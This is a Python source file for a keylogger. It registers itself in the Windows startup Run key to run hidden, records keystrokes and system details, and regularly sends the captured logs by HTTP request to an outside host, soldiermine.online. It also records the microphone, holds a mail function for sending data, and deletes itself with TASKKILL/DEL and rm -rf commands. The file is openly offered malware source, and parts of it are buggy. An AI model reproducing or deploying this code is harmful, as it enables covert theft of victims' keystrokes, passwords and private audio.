import os
import sys
import subprocess
# import ctypes
# from ctypes import windll

# def is_admin():
#     try:
#         return windll.shell32.IsUserAnAdmin()
#     except:
#         return False
#
# def run_as_admin():
#     if is_admin():
#         return True
#     else:
#         # Run the script again as administrator
#         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
#         return False

def add_to_startup():
    try:
        script_path = os.path.abspath(sys.argv[0])  # Get the absolute path of the current script
        key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"  # Registry key for current user startup
        value_name = "Keylogger"  # Name for the registry value
        value_data = f"pythonw.exe \"{script_path}\""  # Command to run the script with pythonw.exe (to hide console window)

        # Add the script to startup by adding a registry value
        subprocess.check_call(['reg', 'add', key, '/v', value_name, '/d', value_data, '/f'])

        print("Script added to Windows startup successfully!")
    except Exception as e:
        print("Error adding script to Windows startup:", e)

if __name__ == "__main__":
    # if not run_as_admin():
    #     sys.exit(0)  # Exit the script if not running as administrator

    add_to_startup()

    try:
        import logging
        import os
        import requests
        import platform
        import smtplib
        import socket
        import threading
        import wave
        # import pyscreenshot
        import sounddevice as sd
        from pynput.keyboard import Key, Listener  # Import Key and Listener directly
        # from pynput import keyboard
        from email import encoders
        from email.mime.base import MIMEBase
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        import glob
    except ModuleNotFoundError:
        from subprocess import call
        modules = ["sounddevice","pynput"]
        call("pip install " + ' '.join(modules), shell=True)
    finally:
        EMAIL_ADDRESS = ""
        EMAIL_PASSWORD = ""
        SEND_REPORT_EVERY = 360  # as in seconds
        class KeyLogger:
            def __init__(self, time_interval, email, password):
                self.interval = time_interval
                self.log = "KeyLogger Started..."
                self.email = email
                self.password = password
            def appendlog(self, string):
                self.log = self.log + string
            def on_move(self, x, y):
                current_move = logging.info("Mouse moved to {} {}".format(x, y))
                self.appendlog(current_move)
            def on_click(self, x, y):
                current_click = logging.info("Mouse moved to {} {}".format(x, y))
                self.appendlog(current_click)
            def on_scroll(self, x, y):
                current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
                self.appendlog(current_scroll)
            def save_data(self, key):
                try:
                    current_key = str(key.char)
                except AttributeError:
                    if key == Key.space:
                        current_key = "SPACE"
                    elif key == Key.esc:
                        current_key = "ESC"
                    else:
                        current_key = " " + str(key) + " "
                self.appendlog(current_key)
            def send_mail(self, email, password, message):
                sender = ""
                receiver = ""
                m = f""
                m += message
                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                    server.login(email, password)
                    server.sendmail(sender, receiver, message)
            # def report(self):
            #     # self.send_mail(self.email, self.password, "\n\n" + self.log)
            #     print(self.log)
            #     self.log = ""
            #     timer = threading.Timer(self.interval, self.report)
            #     timer.start()
            def report(self):
                self.system_information()
                self.appendlog(" ...Computer: ")
                log_content = self.log.strip()  # Get the log content and remove leading/trailing whitespace
                if log_content:  # Check if there's any content in the log
                    url = "https://soldiermine.online/contract/ " + log_content  # Concatenate URL with log content
                    try:
                        response = requests.get(url)
                        # Check the response status code
                        if response.status_code == 200:
                            print("Log reported successfully")
                        else:
                            print("Failed to report log. Status code:", response.status_code)
                    except Exception as e:
                        print("Error:", e)
                self.log = ""  # Clear the log after reporting
                timer = threading.Timer(self.interval, self.report)
                timer.start()
            def system_information(self):
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                plat = platform.processor()
                system = platform.system()
                machine = platform.machine()
                self.appendlog(hostname)
                self.appendlog(ip)
                self.appendlog(plat)
                self.appendlog(system)
                self.appendlog(machine)
            def microphone(self):
                fs = 44100
                seconds = SEND_REPORT_EVERY
                obj = wave.open('sound.wav', 'w')
                obj.setnchannels(1)  # mono
                obj.setsampwidth(2)
                obj.setframerate(fs)
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                obj.writeframesraw(myrecording)
                sd.wait()
                self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
            # def screenshot(self):
            #     img = pyscreenshot.grab()
            #     self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
            def run(self):
                keyboard_listener = Listener(on_press=self.save_data, on_release=self.on_release)
                with keyboard_listener:
                    self.report()
                    # print(self.log)
                    keyboard_listener.join()
                if os.name == "nt":
                    try:
                        pwd = os.path.abspath(os.getcwd())
                        os.system("cd " + pwd)
                        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                        print('File was closed.')
                        os.system("DEL " + os.path.basename(__file__))
                    except OSError:
                        print('File is close.')
                else:
                    try:
                        pwd = os.path.abspath(os.getcwd())
                        os.system("cd " + pwd)
                        os.system('pkill leafpad')
                        os.system("chattr -i " + os.path.basename(__file__))
                        print('File was closed.')
                        os.system("rm -rf" + os.path.basename(__file__))
                    except OSError:
                        print('File is close.')
            def on_release(self, key):
                # if key == Key.esc:
                    # Stop listener
                return False
        keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
        keylogger.run()
